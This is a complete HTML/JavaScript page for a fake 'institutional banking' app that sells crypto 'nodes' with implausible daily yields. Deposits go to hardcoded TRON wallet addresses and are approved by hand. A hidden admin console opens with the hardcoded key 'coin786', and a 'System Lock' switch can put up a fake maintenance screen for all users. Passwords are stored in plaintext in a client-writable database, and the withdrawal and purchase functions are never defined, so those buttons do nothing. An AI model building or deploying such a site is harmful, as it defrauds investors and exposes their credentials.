<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS BANKING | Institutional Asset Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap');
        :root { --primary: #0f172a; --accent: #2563eb; --success: #10b981; --error: #ef4444; }
        body { background: #f8fafc; color: #1e293b; font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; }
        
        .card-bank { background: #ffffff; border: 1px solid #e2e8f0; border-radius: 16px; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05); }
        .btn-bank { background: var(--primary); color: #fff; border-radius: 10px; font-weight: 700; padding: 14px; transition: 0.2s; border: none; cursor: pointer; width: 100%; text-transform: uppercase; font-size: 11px; letter-spacing: 1px; }
        .btn-bank:active { transform: scale(0.98); }
        .input-bank { background: #f1f5f9; border: 1px solid #e2e8f0; border-radius: 10px; padding: 14px; width: 100%; outline: none; transition: 0.2s; font-size: 14px; }
        .input-bank:focus { border-color: var(--accent); background: #fff; }
        
        .badge-pending { color: #b45309; background: #fef3c7; padding: 4px 10px; border-radius: 6px; font-size: 10px; font-weight: 800; }
        .badge-cleared { color: #065f46; background: #dcfce7; padding: 4px 10px; border-radius: 6px; font-size: 10px; font-weight: 800; }
        .badge-declined { color: #991b1b; background: #fee2e2; padding: 4px 10px; border-radius: 6px; font-size: 10px; font-weight: 800; }

        .nav-link { color: #64748b; font-size: 10px; font-weight: 700; text-align: center; cursor: pointer; transition: 0.2s; }
        .nav-link.active { color: var(--accent); }
        
        .hidden { display: none !important; }
        #system-lock { position: fixed; inset: 0; background: #fff; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
        .page-entry { animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <div id="system-lock" class="hidden">
        <div class="w-14 h-14 border-4 border-slate-100 border-t-blue-600 rounded-full animate-spin"></div>
        <h2 class="mt-8 text-xl font-extrabold text-slate-900">Infrastructure Security Sync</h2>
        <p class="text-slate-500 text-xs mt-2 px-8 font-medium">The terminal is currently locked for institutional database optimization. Please wait.</p>
    </div>

    <div id="auth-layer" class="min-h-screen flex items-center justify-center p-6 bg-slate-50">
        <div class="max-w-md w-full">
            <div class="text-center mb-12">
                <h1 class="text-3xl font-extrabold tracking-tighter text-slate-900">NEXUS<span class="text-blue-600">BANKING</span></h1>
                <p class="text-[10px] text-slate-400 font-bold uppercase tracking-[5px] mt-2">Institutional Management Terminal</p>
            </div>

            <div id="login-form" class="card-bank p-8 space-y-5">
                <h2 class="text-xs font-bold uppercase text-slate-500 mb-2">Access Credentials</h2>
                <input type="text" id="user-id" placeholder="Account Identifier" class="input-bank">
                <input type="password" id="user-key" placeholder="Security Passcode" class="input-bank">
                <button onclick="executeLogin()" class="btn-bank shadow-lg shadow-blue-500/10">Authorize Access</button>
                <p class="text-center text-xs font-bold text-slate-400 mt-6 uppercase">New Client? <span onclick="toggleAuth(true)" class="text-blue-600 cursor-pointer">Establish Account</span></p>
            </div>

            <div id="signup-form" class="card-bank p-8 space-y-5 hidden border-t-4 border-blue-600">
                <h2 class="text-xs font-bold uppercase text-slate-500 mb-2">Identity Creation</h2>
                <input type="text" id="new-id" placeholder="Desired Username" class="input-bank">
                <input type="password" id="new-key" placeholder="Set Passcode" class="input-bank">
                <input type="text" id="ref-id" placeholder="Referral Hash (Optional)" class="input-bank">
                <button onclick="executeSignup()" class="btn-bank">Initialize Profile</button>
                <p class="text-center text-xs font-bold text-slate-400 mt-6 uppercase">Member? <span onclick="toggleAuth(false)" class="text-blue-600 cursor-pointer">Login to Terminal</span></p>
            </div>
        </div>
    </div>

    <div id="main-terminal" class="hidden pb-24">
        <header class="bg-white/90 backdrop-blur-md border-b border-slate-200 p-5 sticky top-0 z-50 flex justify-between items-center">
            <div class="flex items-center gap-4">
                <div id="cmd-trigger" class="w-10 h-10 bg-slate-900 text-white rounded-xl flex items-center justify-center font-black">NB</div>
                <div>
                    <p id="display-user" class="text-xs font-black text-slate-900 uppercase tracking-tighter">CLIENT: ---</p>
                    <p class="text-[9px] font-bold text-emerald-600 uppercase">Tier: Institutional</p>
                </div>
            </div>
            <div class="flex gap-4 items-center">
                <a href="https://t.me/your_official_channel" target="_blank" class="text-blue-600 text-xl"><i class="fa-brands fa-telegram"></i></a>
                <button onclick="terminateSession()" class="text-slate-400 hover:text-red-500"><i class="fa-solid fa-power-off"></i></button>
            </div>
        </header>

        <main id="summary-page" class="p-5 space-y-5 page-entry">
            <div class="card-bank p-8 bg-slate-900 text-white border-none shadow-2xl relative overflow-hidden">
                <div class="relative z-10">
                    <p class="text-[10px] font-bold uppercase text-slate-400 tracking-widest">Available Liquidity</p>
                    <h2 id="balance-val" class="text-4xl font-bold mt-2 tracking-tighter">$0.00</h2>
                    <div class="mt-10 flex justify-between border-t border-slate-800 pt-6">
                        <div>
                            <p class="text-[9px] font-bold text-slate-500 uppercase">Total Settled Yield</p>
                            <p id="profit-val" class="text-2xl font-bold text-emerald-400">+$0.00</p>
                        </div>
                        <button onclick="shareLink()" class="bg-white/10 hover:bg-white/20 text-white px-4 py-2 rounded-lg text-[10px] font-black uppercase tracking-tighter self-end">Share Terminal</button>
                    </div>
                </div>
                <div class="absolute -right-10 -top-10 w-40 h-40 bg-blue-600/10 rounded-full blur-3xl"></div>
            </div>
            
            <h3 class="text-[10px] font-black text-slate-400 uppercase tracking-[3px] ml-1 pt-4">Infrastructure Nodes</h3>
            <div id="active-nodes" class="space-y-3"></div>
        </main>

        <main id="market-page" class="p-5 space-y-6 hidden page-entry">
            <div class="flex items-center justify-between">
                <h3 class="text-xs font-black text-slate-900 uppercase tracking-widest border-l-4 border-blue-600 pl-3">Sovereign Asset Nodes</h3>
            </div>
            <div id="elite-grid" class="grid gap-4"></div>
            
            <h3 class="text-xs font-black text-slate-900 uppercase tracking-widest border-l-4 border-slate-300 pl-3 mt-8">Retail Asset Nodes</h3>
            <div id="retail-grid" class="grid gap-4"></div>
        </main>

        <main id="ledger-page" class="p-5 space-y-4 hidden page-entry">
            <h3 class="text-xs font-black text-slate-900 uppercase tracking-widest">Transaction Statement</h3>
            <div id="ledger-list" class="space-y-2"></div>
        </main>

        <main id="vault-page" class="p-5 space-y-5 hidden page-entry">
            <div class="card-bank p-6 space-y-5">
                <h3 class="text-xs font-black uppercase text-slate-900">Capital Deposit</h3>
                <select id="asset-type" class="input-bank font-bold" onchange="toggleAssetUI()">
                    <option value="">Select Asset Network</option>
                    <option value="USDT_TRC20">USDT (TRC20)</option>
                    <option value="TRX">TRX (TRON)</option>
                </select>
                <div id="asset-ui" class="hidden space-y-4 border-t border-slate-100 pt-5">
                    <div class="bg-slate-50 p-4 rounded-xl text-center border border-slate-200">
                        <p class="text-[9px] font-bold text-slate-400 uppercase mb-1">Target Address</p>
                        <p id="target-addr" class="text-[11px] font-mono font-black text-blue-600 break-all select-all"></p>
                    </div>
                    <input type="number" id="asset-amt" placeholder="Deposit Amount ($)" class="input-bank">
                    <input type="text" id="asset-tid" placeholder="Transaction Hash / ID" class="input-bank">
                    <div class="p-4 border-2 border-dashed border-slate-200 rounded-xl">
                        <input type="file" id="asset-proof" class="text-xs font-bold text-slate-500">
                        <p class="text-[8px] font-bold text-slate-400 mt-2 uppercase">Upload Proof (Max 2MB)</p>
                    </div>
                    <button onclick="commitDeposit()" class="btn-bank shadow-xl shadow-blue-600/20">Submit for Audit</button>
                </div>
            </div>

            <div class="card-bank p-6 space-y-5">
                <h3 class="text-xs font-black uppercase text-slate-900">Capital Withdrawal</h3>
                <input type="number" id="with-amt" placeholder="Amount to Egress ($)" class="input-bank">
                <input type="text" id="with-addr" placeholder="Destination Wallet Address" class="input-bank">
                <button onclick="commitWithdrawal()" class="btn-bank !bg-slate-700">Request Payout</button>
            </div>
        </main>

        <main id="corp-page" class="p-5 space-y-5 hidden page-entry">
            <div class="card-bank p-6">
                <h3 class="text-xs font-black text-slate-900 uppercase mb-4 tracking-widest">Support & Community</h3>
                <p class="text-xs text-slate-500 leading-relaxed mb-6">Access official documentation, node audit reports, and live protocol status via our institutional Telegram.</p>
                <a href="https://t.me/your_official_channel" target="_blank" class="btn-bank block text-center !bg-[#24A1DE] py-4">Join Telegram Channel</a>
            </div>
            <div class="card-bank p-6">
                <h3 class="text-xs font-black text-slate-900 uppercase mb-4 tracking-widest">Legal & Privacy</h3>
                <div class="space-y-5">
                    <div class="text-xs">
                        <p class="font-bold text-slate-800">1. Data Encryption</p>
                        <p class="text-slate-500 mt-1">All terminal actions are hashed via end-to-end encryption protocols.</p>
                    </div>
                    <div class="text-xs">
                        <p class="font-bold text-slate-800">2. Capital Safety</p>
                        <p class="text-slate-500 mt-1">Capital is managed within segregated liquidity pools for node stability.</p>
                    </div>
                </div>
            </div>
        </main>

        <nav class="fixed bottom-0 left-0 right-0 bg-white/90 backdrop-blur-2xl border-t border-slate-200 p-4 flex justify-around items-center z-50">
            <div onclick="route('summary')" class="nav-link active"><i class="fa-solid fa-grid-2 text-xl"></i><p class="mt-1">Home</p></div>
            <div onclick="route('market')" class="nav-link"><i class="fa-solid fa-layer-group text-xl"></i><p class="mt-1">Nodes</p></div>
            <div onclick="route('ledger')" class="nav-link"><i class="fa-solid fa-receipt text-xl"></i><p class="mt-1">Ledger</p></div>
            <div onclick="route('vault')" class="nav-link"><i class="fa-solid fa-vault text-xl"></i><p class="mt-1">Vault</p></div>
            <div onclick="route('corp')" class="nav-link"><i class="fa-solid fa-building text-xl"></i><p class="mt-1">Corp</p></div>
        </nav>
    </div>

    <div id="cmd-console" class="fixed inset-0 bg-white z-[10000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8 border-b pb-5">
            <h2 class="text-sm font-black text-slate-900 uppercase tracking-widest">Master Console</h2>
            <button onclick="document.getElementById('cmd-console').classList.add('hidden')" class="text-4xl text-slate-300">&times;</button>
        </div>
        <button id="main-btn" onclick="toggleSystemLock()" class="btn-bank mb-10">System Lock: OFF</button>
        <div id="pending-audits" class="space-y-4"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        // CONFIGURATION
        const firebaseConfig = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        const nodes = {
            sovereign: [
                { id: 501, name: "Sovereign Tier-Alpha", price: 2500, daily: 240, img: "https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=300" },
                { id: 502, name: "Sovereign Tier-Beta", price: 6000, daily: 650, img: "https://images.unsplash.com/photo-1644088379091-d574269d422f?w=300" }
            ],
            retail: Array.from({length: 6}, (_, i) => ({
                id: i+1, name: `Node Protocol R-${i+1}`, price: 100 + (i*150), daily: 10 + (i*14), img: `https://images.unsplash.com/photo-1614850523296-d8c1af93d400?w=300&sig=${i}`
            }))
        };

        window.onload = () => {
            renderAssets();
            trackSystemState();
            const u = localStorage.getItem('nexus_user');
            if(u) initializeTerminal(u);
        };

        function renderAssets() {
            document.getElementById('elite-grid').innerHTML = nodes.sovereign.map(n => assetUI(n, true)).join('');
            document.getElementById('retail-grid').innerHTML = nodes.retail.map(n => assetUI(n, false)).join('');
        }

        const assetUI = (n, isElite) => `
            <div class="card-bank overflow-hidden flex items-center h-28">
                <img src="${n.img}" class="w-28 h-28 object-cover">
                <div class="px-5 flex-1">
                    <h4 class="text-[10px] font-black uppercase tracking-tight">${n.name}</h4>
                    <p class="text-[10px] font-bold text-emerald-600 mt-1">Settlement: $${n.daily}/24h</p>
                    <div class="flex justify-between items-center mt-3">
                        <span class="text-base font-black">$${n.price}</span>
                        <button onclick="deployNode(${n.id})" class="bg-slate-900 text-white text-[9px] font-black px-4 py-2 rounded-lg uppercase tracking-wider">Deploy</button>
                    </div>
                </div>
            </div>`;

        // TERMINAL OPERATIONS
        function initializeTerminal(uid) {
            document.getElementById('auth-layer').classList.add('hidden');
            document.getElementById('main-terminal').classList.remove('hidden');
            document.getElementById('display-user').innerText = `CLIENT: ${uid}`;
            
            onValue(ref(db, `users/${uid}`), (snap) => {
                const data = snap.val(); if(!data) return;
                document.getElementById('balance-val').innerText = '$' + (data.balance || 0).toFixed(2);
                document.getElementById('profit-val').innerText = '+$' + (data.profit || 0).toFixed(2);
                
                // Active Assets
                const active = data.nodes ? Object.entries(data.nodes) : [];
                document.getElementById('active-nodes').innerHTML = active.map(([k, v]) => `
                    <div class="card-bank p-5 flex justify-between items-center border-l-4 border-blue-600">
                        <div><p class="text-[10px] font-black uppercase">${v.name}</p><p class="text-[9px] text-slate-400 font-bold uppercase mt-1">Status: Stable Yield</p></div>
                        <div class="text-right">
                            <span class="text-xs font-mono font-bold bg-slate-100 px-3 py-1.5 rounded-lg timer" data-next="${v.nextClaim}">00:00:00</span>
                        </div>
                    </div>`).join('') || '<div class="text-center py-10 text-[10px] font-black text-slate-300 uppercase tracking-widest">No Active Deployment</div>';

                // Transaction Ledger
                const logs = data.history ? Object.entries(data.history).reverse() : [];
                document.getElementById('ledger-list').innerHTML = logs.map(([k, l]) => `
                    <div class="card-bank p-4 flex justify-between items-center">
                        <div><p class="text-[10px] font-black uppercase italic">${l.type}</p><p class="text-[9px] text-slate-400 font-bold mt-1">${l.date}</p></div>
                        <div class="text-right"><p class="text-xs font-black text-slate-900">$${parseFloat(l.amount).toFixed(2)}</p><span class="badge-${l.status.toLowerCase()}">${l.status}</span></div>
                    </div>`).join('') || '<div class="text-center py-10 text-[10px] font-black text-slate-300 uppercase italic">Ledger Clean</div>';
            });
        }

        // DEPOSIT EXECUTION
        window.commitDeposit = () => {
            const proofFile = document.getElementById('asset-proof').files[0];
            if(!proofFile) return alert("Audit proof required.");
            const reader = new FileReader();
            reader.readAsDataURL(proofFile);
            reader.onload = async () => {
                const uid = localStorage.getItem('nexus_user'), hKey = push(ref(db, 'admin/requests')).key;
                const payload = { id: hKey, user: uid, amount: document.getElementById('asset-amt').value, tid: document.getElementById('asset-tid').value, proof: reader.result, status: 'Pending', type: 'Deposit', date: new Date().toLocaleString() };
                await set(ref(db, `admin/requests/${hKey}`), payload);
                await set(ref(db, `users/${uid}/history/${hKey}`), payload);
                alert("Deposit Logged. Auditing initiated.");
                route('ledger');
            };
        };

        // COMMAND CENTER (ADMIN)
        let taps = 0; document.getElementById('cmd-trigger').onclick = () => { taps++; if(taps === 4) { if(prompt("Security Key:") === "coin786") { document.getElementById('cmd-console').classList.remove('hidden'); loadAudits(); } taps = 0; } };

        function loadAudits() {
            onValue(ref(db, 'admin/requests'), (s) => {
                const data = s.val();
                document.getElementById('pending-audits').innerHTML = data ? Object.values(data).map(r => `
                    <div class="card-bank p-5 space-y-4 shadow-xl">
                        <div class="flex justify-between font-black text-[10px] uppercase"><span>${r.type} [${r.user}]</span><span>$${r.amount}</span></div>
                        ${r.proof ? `<img src="${r.proof}" class="w-full h-44 object-cover rounded-xl border border-slate-100">` : ''}
                        <div class="flex gap-2">
                            <button onclick="resolveAudit('${r.id}','${r.user}',${r.amount},'Cleared')" class="btn-bank !bg-emerald-600 flex-1">Clear</button>
                            <button onclick="resolveAudit('${r.id}','${r.user}',${r.amount},'Declined')" class="btn-bank !bg-rose-600 flex-1">Decline</button>
                        </div>
                    </div>`).join('') : '';
            });
        }

        window.resolveAudit = async (id, user, amt, status) => {
            if(status === 'Cleared') {
                const s = await get(ref(db, `users/${user}`));
                await update(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + parseFloat(amt) });
            }
            await update(ref(db, `users/${user}/history/${id}`), { status });
            await remove(ref(db, 'admin/requests/' + id));
        };

        // NAVIGATION & CORE
        window.route = (p) => { ['summary','market','ledger','vault','corp'].forEach(x => document.getElementById(x+'-page').classList.add('hidden')); document.getElementById(p+'-page').classList.remove('hidden'); document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active')); event.currentTarget.classList.add('active'); };
        window.executeLogin = async () => { const u = document.getElementById('user-id').value.trim(), k = document.getElementById('user-key').value; if(!u || !k) return; const s = await get(ref(db, `users/${u}`)); if(s.exists() && s.val().password === k) { localStorage.setItem('nexus_user', u); initializeTerminal(u); } else alert("Authorization Failed."); };
        window.executeSignup = async () => { const u = document.getElementById('new-id').value.trim(), k = document.getElementById('new-key').value; if(u && k) { await set(ref(db, `users/${u}`), { username: u, password: k, balance: 0, profit: 0 }); toggleAuth(false); } };
        window.toggleAuth = (s) => { document.getElementById('login-form').classList.toggle('hidden', s); document.getElementById('signup-form').classList.toggle('hidden', !s); };
        window.toggleAssetUI = () => { const m = document.getElementById('asset-type').value; document.getElementById('target-addr').innerText = m === 'USDT_TRC20' ? 'TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ' : 'TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76'; document.getElementById('asset-ui').classList.remove('hidden'); };
        window.trackSystemState = () => onValue(ref(db, 'system/maintenance'), (s) => { document.getElementById('system-lock').classList.toggle('hidden', !s.val()); document.getElementById('main-btn').innerText = s.val() ? "SYSTEM LOCK: ON" : "SYSTEM LOCK: OFF"; });
        window.toggleSystemLock = async () => { const s = await get(ref(db, 'system/maintenance')); await set(ref(db, 'system/maintenance'), !s.val()); };
        window.terminateSession = () => { localStorage.clear(); location.reload(); };
        window.shareLink = () => { navigator.clipboard.writeText(window.location.href + "?ref=" + localStorage.getItem('nexus_user')); alert("Referral Protocol Link Copied."); };

        // YIELD TIMER CLOCK
        setInterval(() => {
            document.querySelectorAll('.timer').forEach(el => {
                const diff = parseInt(el.dataset.next) - Date.now();
                if(diff > 0) {
                    const h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
                    el.innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
                } else el.innerText = "Syncing...";
            });
        }, 1000);
    </script>
</body>
</html>
